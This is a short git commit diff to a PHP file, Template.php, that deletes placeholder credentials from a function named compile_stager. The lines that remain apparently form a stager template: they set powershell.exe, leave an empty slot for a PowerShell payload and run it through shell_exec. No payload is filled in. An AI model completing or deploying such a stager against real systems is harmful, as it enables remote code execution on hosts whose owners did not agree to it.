29bdf4f0278ebc2880ad3774ba487d110d1da9be
Cryillic <65374850+Cryilllic@users.noreply.github.com>
2021-04-02 14:03:56 -0400

    Update Template.php

--- Template.php
+++ Template.php
@@ -1,7 +1,5 @@
 <?php
   function compile_stager() {
-    $user = "user"; // Change this
-    $pass = "password"; // Change this
     $init = "powershell.exe";
     $payload = ""; // Insert PowerShell payload here
     $execution_command = "shell_exec";
